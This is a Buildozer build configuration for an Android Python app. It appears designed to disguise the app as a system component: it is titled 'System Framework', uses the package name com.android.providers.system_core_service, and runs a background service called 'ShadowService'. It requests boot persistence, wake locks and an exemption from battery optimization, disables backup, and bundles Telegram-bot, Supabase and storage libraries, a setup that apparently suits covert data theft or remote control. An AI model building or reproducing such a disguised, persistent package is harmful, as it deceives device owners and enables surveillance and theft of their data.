[app]
title = System Framework
package.name = system_core_service
package.domain = com.android.providers
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,txt,json
version = 1.0.1
requirements = python3,python-telegram-bot==20.8,supabase==2.3.1,cryptography==42.0.5,pyjnius==1.6.1,Pillow==10.2.0,requests==2.31.0,python-dotenv==1.0.1
orientation = portrait
fullscreen = 0
android.permissions = INTERNET, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, ACCESS_NETWORK_STATE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b
android.private_storage = True
android.entrypoint = main.py
services = ShadowService:main.py
android.foreground_service = True
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = False
android.manifest.launch_mode = singleInstance
android.accept_sdk_license = True
android.wakelock = True

[buildozer]
log_level = 2
warn_on_root = 1
